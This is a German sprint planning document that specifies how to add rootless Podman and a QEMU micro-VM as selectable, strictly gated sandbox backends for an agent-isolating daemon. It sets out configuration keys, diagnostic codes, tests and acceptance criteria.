# Sprint 7 · Podman als zweites Sandbox-Backend unter Linux

Ziel des Sprints: Unter Linux wählt der Nutzer neben bwrap ein zweites Backend, Podman, je Konfiguration, Konfigurationsprofil, Sitzung (`--backend`) und Oberfläche. Zuerst die gemeinsame Stufe (rootless Podman mit der OCI-Laufzeit `crun`, geteilter Kernel), danach die Kernel-Stufe (eigener Gastkernel; seit HUM-442 als QEMU-micro-VM aus Debian-Paketen, Backend `qemu`, [ADR-0021](../docs/adr/0021-qemu-microvm-kernel-level.md), statt der Laufzeit `krun`). Vorgabe bleibt bwrap. Entscheidungen des Inhabers vom 2026-11-11; Entwurf der Entscheidung in [ADR-0020](../docs/adr/0020-podman-sandbox-backend.md), Analyse, offene Messungen (P0 bis P16, K1 bis K8; für die Kernel-Stufe ersetzt durch Q1 bis Q11 von HUM-442) und Aufwand im Abschnitt „Result (desk part, 2026-11-11)" von HUM-292 in [`sprint-5.md`](sprint-5.md).

Zwei Grenzen gelten für jedes Issue dieses Sprints und sind Akzeptanzkriterium, auch wo das Issue sie nicht eigens nennt:

1. Keine Einstellung schwächt die drei Garantien (`README.md`, `docs/SECURITY.md`, `tests/escape/`), und ein Projekt senkt die Isolationsstufe nie (CONVENTIONS 4.11). Werte, die eine Garantie schwächen würden, haben keinen Schlüssel.
2. Eine unsichere oder nicht erfüllbare Einstellung wird mit `Diagnostic` abgelehnt, beim Laden und beim Start, nie still angewendet; ein gewähltes Backend fällt nie still auf ein anderes zurück.

Leitlinie: Die Namen `podman`, `crun`, `krun`, `libkrun` und `conmon` stehen nur unter `daemon/crates/sandbox/src/podman/` (HUM-145, neuer Abschnitt `[podman]` in `tools/coupling-baseline.toml`), die Namen `qemu`, `virtiofsd`, `vhost-device-vsock` und `microvm` nur unter `daemon/crates/sandbox/src/qemu/` (Abschnitt `[qemu]`, HUM-464). Kein neuer Port, keine Abstraktion über Podman oder QEMU. Jeder Commit, der eine Aussage aus `docs/SECURITY.md` berührt, ändert `docs/SECURITY.md` und `docs/THREAT-MODEL.md` im selben Commit. Vor HUM-433 sind die Messungen P0 bis P15 auf der Referenzmaschine aufgeschrieben, vor HUM-437 auch P17 (Ergebnis in den Abschnitt von HUM-292), vor HUM-443 die Messungen der Kernel-Stufe (HUM-442, Q1 bis Q11). Tor: Keine Stufe ist wählbar, weder in der Konfiguration noch über die CLI, die Oberfläche oder `auto`, bevor ihre Einhänge-Prüfung gelandet (HUM-437, HUM-446) und die Escape-Suite gegen sie in der CI grün ist (HUM-435, HUM-445). Bis zur Zulassung (HUM-448 für Podman, HUM-449 für `qemu`) lehnt jeder Start sie mit `SANDBOX_048` ab; nur die Escape-Suite und die Tests starten eine nicht zugelassene Stufe, über ein Argument im Code, nie über einen Schlüssel.

Diagnose-Codes, hier nur geplant (registriert vom genannten Issue in `codes.rs` und `docs/DIAGNOSTICS.md`, Bereich `SANDBOX` wächst in HUM-431 von 001-033 auf 001-059):

| Code | Bedeutung | Issue |
|---|---|---|
| `SANDBOX_034` | Gewähltes Backend nicht verfügbar; nennt die fehlende Voraussetzung und den Weg zurück (`--backend bwrap`) | HUM-431 |
| `SANDBOX_035` | Backend liegt unter der Isolationsuntergrenze `sandbox.min_isolation` | HUM-431 |
| `SANDBOX_036` | Das Sandbox-Profil verlangt ein anderes Backend als gewählt | HUM-431 |
| `SANDBOX_037` | Podman zu alt oder ohne nötige Fähigkeit (Laufzeit nicht `crun`) | HUM-433 |
| `SANDBOX_038` | Podman nicht rootless, entfernt (`CONTAINER_HOST`, `--remote`) oder eine Podman-Maschine | HUM-433 |
| `SANDBOX_039` | Keine untergeordneten IDs für `--userns keep-id` (`/etc/subuid`, `/etc/subgid`, `newuidmap`) | HUM-433 |
| `SANDBOX_040` | cgroup-Controller `memory`, `pids`, `cpu` nicht delegiert; Grenzen nicht durchsetzbar | HUM-433 |
| `SANDBOX_041` | Container oder VM-Unit einer früheren Sitzung gefunden und entfernt, oder nicht entfernbar (Warnung) | HUM-433, HUM-444 |
| `SANDBOX_042` | Ein eingehängter Ordner ist nicht der geprüfte (Gerät und Inode) | HUM-437 |
| `SANDBOX_043` | Abbild fehlt lokal oder trägt nicht den erwarteten Digest | HUM-439 |
| `SANDBOX_044` | SELinux erzwingt Etiketten; ein Einhängen verlangte Umetikettieren des Projekts | HUM-433 |
| `SANDBOX_045` | Voraussetzung der Kernel-Stufe fehlt: `/dev/kvm`, ein Programm (`qemu-system-x86`, `virtiofsd`, `vhost-device-vsock`), Kernel-Abbild nicht lesbar, Modulverzeichnis, bwrap ohne `--bind-fd` | HUM-464 |
| `SANDBOX_046` | Tür der Kernel-Stufe nicht aufgebaut: vsock-Gerät oder Lauscher der Sitzung fehlt | HUM-464 |
| `SANDBOX_047` | Host-Prüfung des VMM gescheitert (mehr als `lo`, unerklärter Deskriptor oder Socket) | HUM-464 |
| `SANDBOX_048` | Stufe noch nicht zugelassen; wird von HUM-448 (Podman) und HUM-449 (`qemu`) freigegeben | HUM-431 |
| `SANDBOX_049` | Die Mounttabelle in der Sandbox weicht vom Plan ab (zusätzlicher oder fehlender Einhängepunkt) | HUM-437 |
| `DOCTOR_014` | Probestart des Podman-Backends gescheitert | HUM-436 |
| `DOCTOR_015` | Probestart der Kernel-Stufe gescheitert | HUM-444 |

| ID | Titel | Größe | Abhängigkeiten |
|---|---|---|---|
| HUM-428 | Port neutral: `PlanRequest`, `LaunchOptions`, `IsolationLevel`, Enum `Backend` statt `PlatformBackend` | L | HUM-292 |
| HUM-429 | Vorschau und Mounttabelle kommen aus dem Plan, nicht aus bwrap-Flags | M | HUM-428 |
| HUM-430 | Shim: Lebensleine und Umgebung über einen geerbten Deskriptor | M | HUM-428 |
| HUM-431 | Konfiguration: `sandbox.backend`, `sandbox.min_isolation`, Gruppe `sandbox.podman` | M | HUM-428 |
| HUM-432 | RPC und CLI: Backends auflisten, `--backend`, Isolationsstufe im Status | M | HUM-431 |
| HUM-433 | Podman-Adapter, gemeinsame Stufe: erkennen, planen, starten, beenden, prüfen | L | HUM-429, HUM-430, HUM-432 |
| HUM-434 | Podman unter der gehärteten Nutzer-Unit | S | HUM-433 |
| HUM-435 | Escape-Suite je Backend und CI-Job `escape-tests-podman` | M | HUM-433 |
| HUM-436 | `doctor` je Backend mit Probestart | M | HUM-433 |
| HUM-437 | Mounttabelle gleich Plan, geprüfte Ordner nach dem Einhängen belegt, Masken nur auf vorhandenen Pfaden | M | HUM-433, HUM-435 |
| HUM-438 | Podman: Wegwerf-Sandbox mit eigener oberer Schicht | M | HUM-437 |
| HUM-439 | Podman: Abbild als Wurzeldateisystem, mit Digest, ohne Pull beim Start | M | HUM-433 |
| HUM-448 | Podman zulassen: die gemeinsame Stufe wird wählbar | S | HUM-434, HUM-435, HUM-436, HUM-437, HUM-438 |
| HUM-440 | Oberfläche: Backend-Wahl mit Isolationsstufe in Einstellungen und Start | M | HUM-432, HUM-437, HUM-448 |
| HUM-441 | Doku: Podman in README, CONFIG, cli; Nachträge ADR-0002, ADR-0010, ADR-0015; ADR-0020 angenommen | S | HUM-448, HUM-439, HUM-440 |
| HUM-442 | Spike Kernel-Stufe: Weiterleitung, vsock-Tür, Kanäle des VMM, Startzeit, KVM in der CI | M | HUM-433 |
| HUM-464 | Konfiguration und Port: Backend `qemu`, Gruppe `sandbox.qemu`, `krun` entfernt | M | HUM-442 |
| HUM-465 | Shim im Gast: Module laden und sperren, Tür über vsock | M | HUM-442, HUM-437 |
| HUM-443 | Shim: Steuerkanal als Strom, Terminal und weitere Shells im Gast | L | HUM-465 |
| HUM-444 | QEMU-Adapter: Plan, Start in Gefängnissen, Ende, Host-Prüfung, doctor | L | HUM-443, HUM-464, HUM-434 |
| HUM-445 | Escape-Suite der Kernel-Stufe: Proben mit Gast-Root, CI-Job mit KVM | M | HUM-444, HUM-435, HUM-437 |
| HUM-446 | Kernel-Stufe: Projektordner und Wegwerf-Schicht über virtiofs | L | HUM-445, HUM-438 |
| HUM-449 | Kernel-Stufe zulassen: `qemu` wird wählbar | S | HUM-445, HUM-446, HUM-466, HUM-469, HUM-470, HUM-471, HUM-476 |
| HUM-447 | Doku der Kernel-Stufe, Oberfläche schaltet `qemu` frei | S | HUM-449 |
| HUM-451 | Integrationstest: ein Daemon, der die Shell-Tür nicht mehr liest, hält weder Lebensleine noch Agent auf | S | HUM-430 |
| HUM-452 | Podman: ein Container, dessen Client ungeplant endet, wird sofort entfernt, nicht erst beim nächsten Stopp | S | HUM-433 |
| HUM-453 | Podman: `/sys` des Rechners ist im Container verdeckt wie unter bwrap | S | HUM-433 |
| HUM-454 | Podman: die `mounts.conf` des Nutzers erreicht keinen Container | S | HUM-433 |
| HUM-450 | `humanitl sandbox argv` hält zurückgehaltene Werte auch in der CLI zurück | S | HUM-429 |
| HUM-455 | CI: Escape-Suite unter Podman auch mit einem Abbild als Wurzel | M | HUM-439 |
| HUM-456 | Podman: Zugangsdaten zum Ziehen aus einer eigenen Datei des Adapters | S | HUM-439 |
| HUM-457 | Ein laufendes Ziehen eines Abbilds lässt sich abbrechen | S | HUM-439 |
| HUM-458 | PID-1-Integrationstests: ohne nutzbare Sandbox in der CI rot statt übersprungen | S | HUM-451 |
| HUM-459 | Konstanten, die Tests vom Shim abschreiben, bleiben mit ihm im Gleichschritt | S | HUM-451 |
| HUM-460 | Konfiguration: die Beschreibung von `sandbox.podman` nennt die Zulassung von Podman | S | HUM-448 |
| HUM-461 | RPM und AUR empfehlen Podman wie das .deb | S | HUM-441 |
| HUM-462 | Website: Podman als wählbares Backend auf der Sicherheitsseite | S | HUM-441 |
| HUM-463 | Deutsche Übersetzung von ADR-0020 und der deutsche ADR-Index | S | HUM-441 |
| HUM-466 | Kernel-Stufe: beschreibbares `/tmp`, `$HOME` und `/run` im Gast | S | HUM-444 |
| HUM-467 | Kernel-Stufe: Obergrenze der Verbindungen über die Tür je Sitzung | S | HUM-444 |
| HUM-468 | Kernel-Stufe: Host-Prüfung kennt die Programme der Unit | S | HUM-444 |
| HUM-469 | Kernel-Stufe: Grenze der Deskriptoren der virtiofsd-Prozesse | S | HUM-444 |
| HUM-470 | Kernel-Stufe: zwei Flakes auf der CI (kvm-Test ohne CHECK, unplanned_mount mit Exit 3) | S | HUM-445 |
| HUM-471 | Kernel-Stufe: Gast ohne Verbindung des Hosts (kvm-Test ohne CHECK), Konsole im Adapterpfad | M | HUM-470 |
| HUM-472 | Website: das Modell als Angreifer (Lazarus, Microsoft Research), mit Quellen | S | — |
| HUM-475 | Website: die deutschen Texte der Start- und der Sicherheitsseite sprachlich überarbeiten | S | HUM-472 |
| HUM-476 | Kernel-Stufe: Dateicache im Gast wieder an, aber begrenzt | M | HUM-469 |

## HUM-428 · Port neutral: `PlanRequest`, `LaunchOptions`, `IsolationLevel`, Enum `Backend` statt `PlatformBackend`

### Kontext
Daemon und CLI halten `PlatformBackend`, einen Typ-Alias, der je Build genau ein Backend kennt (`daemon/crates/sandbox/src/lib.rs:160-177`), und erreichen über die Builder-Methoden von `BwrapBackend` am Port vorbei (`with_stdio`, `with_overlay`, `with_expected_work_inode`, `with_approved_work_dir`, `with_output_sink`, `with_read_only_bind`, `with_report_timeout`, `disposable_support`; Aufrufe in `daemon/crates/ipc/src/sandbox.rs:2451-2452, 2615-2650, 3454-3457` und `daemon/bin/humanitl/src/cmd/sandbox.rs:186, 860, 1136-1139`). Seatbelt kam über `cfg`-Zweige hinein. Ein Backend, das der Nutzer je Sitzung wählt, braucht eine Wahl zur Laufzeit.

### Spezifikation
1. `launcher.rs` bekommt `IsolationLevel` (`Policy < Namespaces < Kernel`, `as_str` in `snake_case`), `LaunchOptions` (Felder wie im Entwurf des HUM-292-Ergebnisses, Abschnitt 2) und `PlanRequest<'a>`.
2. `SandboxBackend` wird zu `name`, `isolation`, `disposable_support(&PlanRequest)`, `plan(&PlanRequest)`, `launch`, `isolation_check`. `preview` kommt in HUM-429.
3. Neues Enum `Backend { Bwrap, #[cfg(macos)] Seatbelt }` mit `impl SandboxBackend` durch Weiterreichen, `Backend::detect(name, paths)` und `Backend::fallback(name, paths)`; `PlatformBackend` und die Builder-Methoden entfallen, ihre Werte stehen in `LaunchOptions`. `PLATFORM_BACKEND_NAME` bleibt nur als Name des Systems für `auto`.
4. `LaunchPlan::env_on_program: bool` wird `EnvDelivery { Argv, Program }` (die dritte Variante kommt in HUM-430); `LaunchOnce::status` wird `Option<PipeReader>`; neues privates `Teardown { Process }` am Plan und am Handle, `SandboxHandle::kill` und `terminate` gehen darüber.
5. Daemon (`Running.backend`, `Prepared.backend`), CLI, `escape-launch` und die Tests nutzen `Backend` und `LaunchOptions`. Verhalten unverändert.
6. `tools/coupling-baseline.toml` mit `python3 tools/check_coupling.py --update` nachgezogen; keine Zahl steigt.

### Tests
- Unit: `IsolationLevel` ist geordnet, `as_str` stabil; `Backend::detect("bwrap", ..)` auf einem System ohne `bwrap` liefert `SANDBOX_001`.
- Unit: `LaunchOptions::default()` erzeugt mit `BwrapBackend` dieselbe Kommandozeile wie vorher `BwrapBackend::unchecked(..)` ohne Builder (Vergleich mit einer festgehaltenen Zeile aus dem Stand vor dem Umbau).
- Bestehende Suiten der Crates `humanitl-sandbox`, `humanitl-ipc` und `humanitl` grün, unverändert in ihren Erwartungen.
- Mutationsbeweis: `LaunchOptions::approved_work_dir` im bwrap-Plan ignoriert färbt den vorhandenen Test zu HUM-294 rot.

### Akzeptanzkriterien
1. Kein Aufrufer außerhalb von `daemon/crates/sandbox` nennt `BwrapBackend` oder `SeatbeltBackend`, außer Tests, die ein konkretes Backend prüfen.
2. Die Kommandozeile jeder bestehenden Sitzungsart (direkt, Wegwerf, PTY, Capture) ist Byte für Byte die alte.
3. Kopplungszahlen fallen oder bleiben, `make deps-lint` grün.
4. Der CI-Job `macos` ist der Beleg für die `cfg`-Zweige (Seatbelt-Variante von `Backend`, `LaunchOptions` mit Klon): Er läuft auf dem Issue-Branch voll, auch wenn die Pfadregeln von HUM-424 ihn sonst überspringen würden, und ist grün. Ohne diesen Lauf landet der Commit nicht.

### Fallstricke
- `Running.backend` hält dieselbe Instanz, die gestartet hat, wegen der Frist des Berichts (`ipc/src/sandbox.rs:316-325`); mit `LaunchOptions` gehört `report_timeout` in die Optionen des Starts und muss am `Running` mitgehalten werden, sonst prüft `isolation_check` mit der Vorgabe.
- `#[cfg(target_os = "macos")]`-Zweige in `ipc/src/sandbox.rs` (2488-2496, 2636, 4039-4084) bleiben bis HUM-429; nicht in diesem Commit zusammenziehen.
- Keine `dyn SandboxBackend`-Box: die Optionen tragen `OutputSink`, und das Enum hält `Clone`.

## HUM-429 · Vorschau und Mounttabelle kommen aus dem Plan, nicht aus bwrap-Flags

### Kontext
`Status.mounts` entsteht unter Linux, indem `mounts_of` die bwrap-Zeile Flag für Flag liest (`daemon/crates/ipc/src/sandbox.rs:4192`), die Vorschau ruft `to_bwrap_args` direkt (`4017-4036`), unter macOS gibt es eine eigene Vorschau (`SeatbeltPreview`, `PolicyRow`, `4039-4084`, `4130`). Ein drittes Backend bräuchte einen dritten Parser.

### Spezifikation
1. `SandboxBackend::preview(&PlanRequest) -> PlanPreview` ohne Seiteneffekte: `argv`, `policy: Vec<PolicyRow>`, `env`, `policy_text`, `door: Door`, `limits: ResourceLimits` (bei bwrap leer).
2. `PolicyRow` wandert aus `seatbelt/` nach `launcher.rs` und trägt Modus, Quelle, Ziel, Herkunft (Profil, Sitzung, Nutzer) und den Namen aus der Profildatei; bwrap erzeugt die Zeilen beim Übersetzen des Profils aus denselben Daten wie die Argumente, nicht aus den Argumenten.
3. `mounts_of` entfällt; `Prepared::shown` nutzt `preview` für jedes Backend. Die `cfg`-Zweige von `argv`, `shown`, `mount_of_rule` fallen weg.
4. `Door` hat die Varianten `SocketFile`, `LoopbackPort`, `VsockPort`; `Status` bekommt das Feld `door` als Text (`PROTO_MINOR` steigt).

### Tests
- Unit je Backend: Jede Zeile von `policy` hat ein Gegenstück in `argv` (bwrap: Ziel steht hinter einem Bind-Flag), und jedes Bind-Flag in `argv` hat eine Zeile. Das ersetzt den Parser durch einen Vergleich in beide Richtungen.
- Snapshot-Test: Die Mounttabelle des Profils `default` ist vor und nach dem Umbau gleich (festgehaltene Erwartung aus dem Stand vor dem Umbau).
- Mutationsbeweis: eine Maske in `to_bwrap_args` ohne `PolicyRow` färbt den Vergleichstest rot.

### Akzeptanzkriterien
1. Oberfläche und `humanitl sandbox argv` zeigen unter Linux und macOS dasselbe wie vorher; die Tabelle verliert keinen Mount.
2. Kein Code außerhalb der Adapter liest Backend-Flags.
3. Kopplung von `ipc/src/sandbox.rs` sinkt, Grundlinie nachgezogen.

### Fallstricke
- Die Zurückhaltung von Umgebungswerten (`redact_hidden_values`, `WITHHELD_PLACEHOLDER`) gilt weiter für `argv` jedes Backends, das Werte in der Zeile trägt; die Entscheidung bleibt die eine Stelle `Prepared::shows`.
- `Mount.profile_path` und `MOUNT_MODE_DENIED` aus HUM-376 bleiben im Protokoll.

## HUM-430 · Shim: Lebensleine und Umgebung über einen geerbten Deskriptor

### Kontext
Podman startet den Container unter `conmon`, nicht als Kind des aufrufenden Prozesses; ein `SIGKILL` an `podman run` lässt den Container weiterlaufen (Messung P7). `--die-with-parent` hat dort kein Gegenstück. Außerdem schreibt Podman jeden `-e`-Wert in die gespeicherte Konfiguration des Containers auf die Platte (Messung P11). Beides löst der Shim, für jedes Backend gleich.

### Spezifikation
1. Neue Option des Shims `--lifeline-fd <n>`: Der Shim (PID 1) wartet neben seinem Kind auf `POLLHUP` oder `EOF` am Deskriptor und beendet dann die Sandbox wie bei `SIGTERM` (Gnadenfrist `KILL_GRACE`, dann `SIGKILL` an alle). Der Daemon hält das Schreibende mit `CLOEXEC`, nur er.
2. Neue Option `--env-fd <n>`: ein versiegelter memfd mit der Umgebung als JSON-Objekt (`String` zu `String`); der Shim liest ihn vor allem anderen, setzt die Umgebung des Agenten daraus und schließt ihn. `RESERVED_ENV` und die Prüfung gegen `LD_*` gelten wie für `--setenv`.
3. `EnvDelivery::InheritedFd(RawFd)` im Plan. bwrap bleibt bei `Argv`; die neue Variante nutzt zuerst Podman. Die Vorschau zeigt die Umgebung weiter in der Tabelle.
4. Beide Deskriptoren gehen nie an den Agenten: der Shim schließt sie vor dem `exec`, wie den Berichts-Deskriptor.

### Tests
- Shim-Unit: `--env-fd` mit kaputtem JSON endet mit `EXIT_SETUP` und einer `CHECK`-Zeile; ein Schlüssel aus `RESERVED_ENV` wird abgelehnt.
- Integration unter bwrap (der Shim ist derselbe): Sandbox mit `--lifeline-fd`, Schreibende im Test geschlossen, die Sandbox endet innerhalb von `KILL_GRACE` plus einer Sekunde.
- Integration: Der Agent sieht weder Lebensleine noch Umgebungs-memfd unter `/proc/self/fd`.
- Mutationsbeweis: `POLLHUP` ignoriert färbt den Lebensleinen-Test rot; das Schließen vor `exec` entfernt färbt den fd-Test rot.

### Akzeptanzkriterien
1. Eine Sandbox mit Lebensleine endet, wenn der Prozess endet, der das Schreibende hält, auch nach `SIGKILL`.
2. Kein Umgebungswert steht in `argv` eines Backends, das `InheritedFd` nutzt.
3. `docs/SECURITY.md` Abschnitt 4 nennt die zwei neuen Deskriptoren und dass der Agent sie nicht erbt; `docs/THREAT-MODEL.md` K-06 nennt die Lebensleine als Ersatz für `--die-with-parent` und K-15 bleibt unverändert, was der Commit-Body begründet.

### Fallstricke
- Das Leseende der Lebensleine ist in jedem Prozess offen, der es erbt (auch im `podman run`-Client); entscheidend ist allein, dass das Schreibende nur im Daemon liegt.
- Der Shim läuft ohne tokio; `poll` auf Lebensleine, Steuerkanal und `SIGCHLD`-Pipe in derselben Schleife, keine zweite.

## HUM-431 · Konfiguration: `sandbox.backend`, `sandbox.min_isolation`, Gruppe `sandbox.podman`

### Kontext
Heute gibt es `sandbox.backend` nur im Sandbox-Profil (`profiles/sandbox/*.toml`, `daemon/crates/sandbox/src/profile.rs:266-290`, geprüft in `1663-1676`), nicht in `config.toml`. Der Inhaber will die Wahl in Konfiguration, Konfigurationsprofil, CLI und Oberfläche, und ein Projekt darf die Stufe nie senken.

### Spezifikation
1. Schema (`daemon/crates/config/src/schema.rs`): `sandbox.backend` (`auto | bwrap | podman | seatbelt`, Vorgabe `auto`, Stufe `basic`, `x-project-scope = "denied"`); `sandbox.min_isolation` (`policy | namespaces | kernel`, Vorgabe `policy`, Stufe `advanced`, `x-project-scope = "allowed"`); Gruppe `sandbox.podman` mit `program`, `runtime` (`crun | krun`), `rootfs` (`host | image`), `image`, `memory_mib`, `cpus`, `pids_limit`, `start_timeout_secs`, alle `denied`, Stufe `advanced` oder `expert`.
2. Für `sandbox.min_isolation` gewinnt über alle Ebenen der strengste Wert, nicht die oberste Ebene; die Herkunftsanzeige nennt die Ebene des strengsten.
3. Auflösung zur Startzeit: Backend aus der Konfiguration (inklusive `cli_overrides` mit `sandbox.backend` auf der Erlaubnisliste des Start-RPC), `auto` wird `bwrap` unter Linux und `seatbelt` unter macOS. Nennt das Sandbox-Profil ein Backend außer `auto`, und ist es ein anderes: `SANDBOX_036`. Liegt die Stufe unter der Untergrenze: `SANDBOX_035`. Ist das Backend nicht verfügbar: `SANDBOX_034`, ohne Rückfall.
4. Wertebereiche: `memory_mib` mindestens 256 und höchstens der Arbeitsspeicher des Hosts, `cpus` größer 0 und höchstens die Zahl der CPUs, `pids_limit` mindestens 64; sonst `CONFIG_003`. `image` ist bei `rootfs = "image"` Pflicht und muss `@sha256:` tragen.
5. `profile.rs` `check_header` kennt `podman`; `seatbelt` weiter nur unter macOS.
6. Zulassung: Eine feste Liste im Code (`ADMITTED_BACKENDS`) nennt, welche Stufen wählbar sind; in diesem Commit nur `bwrap` und `seatbelt`. `sandbox.backend = "podman"` ist im Schema gültig, aber jeder Start damit (Konfiguration, `cli_overrides`, CLI, `doctor --probe`) scheitert mit `SANDBOX_048`; `auto` löst nie auf eine nicht zugelassene Stufe auf. Die Umgehung `Backend::detect_unadmitted` steht hinter dem Cargo-Feature `unadmitted-backends` der Crate `humanitl-sandbox`; nur `escape-launch` (eigenes `required-features`) und die Tests schalten es ein, `humanitld` und `humanitl` nie. Es ist also im ausgelieferten Code nicht vorhanden, nicht nur nicht aufgerufen.
7. Codes `SANDBOX_034` bis `SANDBOX_036` und `SANDBOX_048` registrieren, Bereich `SANDBOX` auf 001-059 erweitern, `docs/DIAGNOSTICS.md` neu erzeugen; `docs/CONFIG.md` aus dem Schema neu erzeugen.

### Tests
- Config-Unit: `sandbox.backend` in `<projekt>/.humanitl/profile.toml` ist `CONFIG_003` (Projekt gesperrt); jeder Schlüssel unter `sandbox.podman` ebenso.
- Config-Unit, Tabelle: `min_isolation` Nutzer `namespaces`, Projekt `kernel` ergibt `kernel`; Nutzer `kernel`, Projekt `policy` ergibt `kernel` (das Projekt senkt nie); CLI `policy` über Nutzer `kernel` ergibt `kernel`.
- Unit: `bwrap` gewählt bei Untergrenze `kernel` ergibt `SANDBOX_035`; Sandbox-Profil `backend = "bwrap"` bei Wahl `podman` ergibt `SANDBOX_036`.
- Unit: `sandbox.backend = "podman"` aus `config.toml`, aus `--backend` und aus `cli_overrides` scheitert vor HUM-448 jeweils mit `SANDBOX_048`.
- Prüfung im Test (`tools/check-deps.sh` oder ein Grep-Test): `detect_unadmitted` und das Feature `unadmitted-backends` erscheinen nur in `escape-launch`, in `#[cfg(test)]`-Code und in `tests/`; `cargo tree -e features -p humanitld` und `-p humanitl` zeigen das Feature nicht.
- Mutationsbeweis: die Zusammenführung von `min_isolation` auf „oberste Ebene gewinnt" umgestellt färbt den Projekt-Test rot; `podman` in `ADMITTED_BACKENDS` eingetragen färbt den Zulassungstest rot.

### Akzeptanzkriterien
1. Jeder neue Schlüssel hat Vorgabe, Stufe und Projekt-Sperre im Schema und erscheint in `docs/CONFIG.md`.
2. Kein Weg aus einem Projekt senkt die Stufe oder wählt das Backend; ein Test je Weg (Projektprofil, Projektumgebung ist keiner, CLI-Override aus dem Start-RPC nur mit Erlaubnisliste).
3. `config_readers.rs` führt die neuen Schlüssel; solange HUM-433 fehlt, sind die `sandbox.podman`-Schlüssel dort als offen mit HUM-433 markiert.

### Fallstricke
- `HUMANITL_SANDBOX__BACKEND` aus der Umgebung ist Ebene 6 und damit Nutzerwille, kein Projektwille; aber `min_isolation` gilt auch gegen sie.
- Das Sandbox-Profil bleibt eine Anforderung, keine zweite Wahl; sonst gibt es zwei Quellen der Wahrheit (ADR-0011).

## HUM-432 · RPC und CLI: Backends auflisten, `--backend`, Isolationsstufe im Status

### Kontext
ADR-0018: Jede Fähigkeit ist zuerst ein RPC. Oberfläche und CLI müssen wissen, welche Backends es gibt, welche Stufe sie bieten und was fehlt, ohne selbst zu prüfen.

### Spezifikation
1. Neues RPC `SandboxBackends(google.protobuf.Empty) returns (SandboxBackendList)`; je Eintrag `name`, `isolation_level`, `available`, `selected`, `diagnostics` (fehlende Voraussetzungen als `Diagnostic`), `runtimes` (bei Podman `crun`, `krun` mit eigener Verfügbarkeit). Die Antwort kommt aus `Backend::detect` je Name, ohne Start.
2. `Sandbox.Status` bekommt `isolation_level`; `backend` nennt weiter das echte Backend, bei Podman mit Laufzeit (`podman/crun`).
3. CLI: `humanitl sandbox backends` (Tabelle, `--json`), `--backend <name>` und `--podman-runtime <crun|krun>` an `humanitl run` und `humanitl sandbox run`, als `cli_overrides`. Die Erlaubnisliste des Start-RPC bekommt genau `sandbox.backend` und `sandbox.podman.runtime`.
4. `fake_daemon_client.dart` und `ipc/src/fake` bekommen den neuen Aufruf (nur eigener Abschnitt, am Ende angehängt); Paritätstabelle nachgezogen. `PROTO_MINOR` steigt.

### Tests
- IPC: Vor HUM-448 ist `podman` `available = false` mit `SANDBOX_048`, auch wenn Podman installiert ist; ohne `podman` im `PATH` steht zusätzlich `SANDBOX_034` mit `fix`; `bwrap` unverändert.
- IPC: `cli_overrides` mit `sandbox.backend = "podman"` bei Untergrenze `kernel` wird mit `SANDBOX_035` abgelehnt; ein anderer Pfad als die zwei erlaubten bleibt `CONFIG_003`.
- CLI: `humanitl sandbox backends --json` gibt die Liste aus dem Fake aus.
- Mutationsbeweis: `cli_overrides` ohne Prüfung der Untergrenze färbt den zweiten IPC-Test rot.

### Akzeptanzkriterien
1. `parity-check` grün, CLI-Zeile für das neue RPC vorhanden.
2. `Status.isolation_level` stimmt mit `SandboxBackend::isolation` des laufenden Backends überein.
3. Kein still gewähltes Ersatz-Backend: Ein nicht verfügbares gewähltes Backend lässt den Start mit `SANDBOX_034` scheitern.

### Fallstricke
- `fake_daemon_client.dart` ist eine gemeinsam genutzte Datei: vor dem Schreiben neu einlesen, nur anhängen.
- Die Liste darf nicht bei jedem Aufruf einen Probestart machen; `doctor` macht ihn (HUM-436).

## HUM-433 · Podman-Adapter, gemeinsame Stufe: erkennen, planen, starten, beenden, prüfen

### Kontext
Kern des Sprints. Entwurf im HUM-292-Ergebnis, Abschnitte 3, 4 und 8. Voraussetzung: P0 bis P9 und P11, P12 gemessen und im Abschnitt von HUM-292 eingetragen.

### Spezifikation
1. Modul `daemon/crates/sandbox/src/podman/` (`mod.rs`, `detect.rs`, `plan.rs`, `teardown.rs`); `PodmanBackend` und die Variante `Backend::Podman`.
2. `detect`: Programm aus `sandbox.podman.program` oder `PATH`, Version mindestens 4.9, rootless, lokal, Laufzeit `crun`, untergeordnete IDs, delegierte Controller, kein erzwingendes SELinux; jede Lücke ein Code aus `SANDBOX_034`, `SANDBOX_037` bis `SANDBOX_040`, `SANDBOX_044` mit `why` und kopierbarem `fix`.
3. `plan`: ein `podman run` mit `--rm`, `--name humanitl-<session>`, Label `humanitl.daemon=<instanz>`, `--network none`, `--ipc private`, `--uts private`, `--pid private`, `--cgroupns private`, `--userns keep-id`, `--cap-drop all`, `--security-opt no-new-privileges`, `--read-only`, `--log-driver none`, `--pull never`, `--hostname sandbox`, `--no-hosts`, `--read-only-tmpfs=false` (sonst legt Podman zu `--read-only` beschreibbare tmpfs auf `/run`, `/tmp` und `/var/tmp`, die nicht im Profil stehen), `--env-host=false`, `--http-proxy=false`, `--hooks-dir <leeres Verzeichnis>`, `--security-opt seccomp=<eigene Datei>`, `--memory`, `--cpus`, `--pids-limit`, `--conmon-pidfile`, `--preserve-fds <n>`; Wurzel `rootfs = "host"` als leeres, nur lesbares Verzeichnis mit den Binds aus dem Profil; Proxy-Socket als einzelne Datei nach `PROXY_SOCKET_DST`; Masken, CA, Bundle, Identitätsdateien und Adapterdateien wie unter bwrap; der Shim als Einstiegspunkt mit `--lifeline-fd`, `--env-fd`, Bericht und, am eigenen PTY, `--control-fd` (HUM-299).
4. Keine Konfigurationsquelle, die der Daemon nicht schreibt, erreicht Podman (Tabelle im HUM-292-Ergebnis, Abschnitt 3): `CONTAINERS_CONF` auf eine vom Daemon geschriebene `containers.conf` mit `default_mounts_file` auf eine leere Datei (kein `mounts.conf`, kein `/run/secrets`), leerem `hooks_dir` und eigenem `seccomp_profile`; `CONTAINERS_STORAGE_CONF` und `CONTAINERS_REGISTRIES_CONF` auf eigene Dateien; `CONTAINERS_CONF_OVERRIDE`, `CONTAINER_HOST`, `CONTAINER_CONNECTION` aus der Umgebung entfernt. Podman startet mit leerer Umgebung außer diesen Variablen, `HOME`, `XDG_RUNTIME_DIR` und `PATH`.
5. `launch` nutzt `launch_plan` (`bwrap.rs:1156`) mit `Teardown::Container`: `podman kill --signal TERM`, `KILL_GRACE`, `podman rm -f`. `sandbox_pid` aus `--conmon-pidfile` und `podman inspect`.
6. `isolation_check` über `isolation_from_report` (die fünf `CHECK`-Zeilen); `isolation()` ist `Namespaces`.
7. Beim Start des Daemons: alle Container mit dem Label der Instanz entfernen, `SANDBOX_041` als Warnung je Rest.
